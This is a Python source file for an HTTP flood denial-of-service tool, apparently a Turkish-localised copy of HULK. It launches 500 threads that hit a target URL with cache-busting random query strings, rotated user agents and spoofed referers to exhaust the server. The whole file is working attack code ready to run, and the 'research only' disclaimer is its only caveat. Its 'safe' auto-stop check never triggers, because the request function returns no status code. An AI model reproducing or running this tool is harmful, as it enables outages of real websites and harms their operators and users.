#      #########################################
       # Author : Dohela                       #
       # Site   : https://dohela.com           #
       # Date   : 5 - 3 - 2020                 #
       # Github : https://github.com/dohelax   #
       #########################################


# ----------------------------------------------------------------------------------------------
# root - HTTP Unbearable Load King
#
# Bu araç, HTTP sunucularına ağır yük bindirerek kaynaklarını tüketmek amacıyla tasarlanmıştır.
# Araştırma amaçlı kullanılması önerilir ve kötü niyetli kullanım yasaktır.
#
# Yazar : Barry Shteiman, version 1.0
# ----------------------------------------------------------------------------------------------
import urllib.request
import sys
import threading
import random
import re

# global değişkenler
url = ''
host = ''
headers_useragents = []
headers_referers = []
request_counter = 0
flag = 0
safe = 0

def inc_counter():
    global request_counter
    request_counter += 1

def set_flag(val):
    global flag
    flag = val

def set_safe():
    global safe
    safe = 1

# Kullanıcı ajanları listesi oluşturur
def useragent_list():
    global headers_useragents
    headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, Gecko) Chrome/4.0.219.6 Safari/532.1')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
    headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    return headers_useragents

# Referans listesini oluşturur
def referer_list():
    global headers_referers
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://www.usatoday.com/search/results?q=')
    headers_referers.append('http://engadget.search.aol.com/search?q=')
    headers_referers.append('http://' + host + '/')
    return headers_referers

# Rastgele ASCII dizesi oluşturur
def buildblock(size):
    return ''.join(chr(random.randint(65, 90)) for _ in range(size))

def usage():
    print('---------------------------------------------------')
    print('USAGE: python root.py <url>')
    print('url\'den sonra "safe" ekleyerek, dos sonrası otomatik kapatmayı etkinleştirebilirsiniz.')
    print('---------------------------------------------------')

# HTTP isteği
def httpcall(url):
    useragent_list()
    referer_list()
    if "?" in url:
        param_joiner = "&"
    else:
        param_joiner = "?"
    request = urllib.request.Request(url + param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10)))
    request.add_header('User-Agent', random.choice(headers_useragents))
    request.add_header('Cache-Control', 'no-cache')
    request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
    request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5, 10)))
    request.add_header('Keep-Alive', str(random.randint(110, 120)))
    request.add_header('Connection', 'keep-alive')
    request.add_header('Host', host)

    try:
        urllib.request.urlopen(request)
    except urllib.error.HTTPError as e:
        set_flag(1)
        print('Ataque Iniciado 65000 Bytes By Killer@Root')
    except urllib.error.URLError as e:
        sys.exit()
    else:
        inc_counter()

# HTTP çağrı iş parçacığı
class HTTPThread(threading.Thread):
    def run(self):
        try:
            while flag < 2:
                code = httpcall(url)
                if code == 500 and safe == 1:
                    set_flag(2)
        except Exception:
            pass

# HTTP iş parçacıklarını izler ve istekleri sayar
class MonitorThread(threading.Thread):
    def run(self):
        previous = request_counter
        while flag == 0:
            if previous + 100 < request_counter and previous != request_counter:
                print(f"{request_counter} İstek Gönderildi")
                previous = request_counter
        if flag == 2:
            print("\n-- Root Saldırısı Tamamlandı --")

# çalıştırma
if len(sys.argv) < 2:
    usage()
    sys.exit()
else:
    if sys.argv[1] == "help":
        usage()
        sys.exit()
    else:
        print("-- Root Saldırısı Başlatıldı By Dohela --")
        if len(sys.argv) == 3 and sys.argv[2] == "safe":
            set_safe()
        url = sys.argv[1]
        if url.count("/") == 2:
            url += "/"
        m = re.search(r'http\://([^/]*)/?.*', url)
        host = m.group(1)
        for i in range(500):
            t = HTTPThread()
            t.start()
        t = MonitorThread()
        t.start()
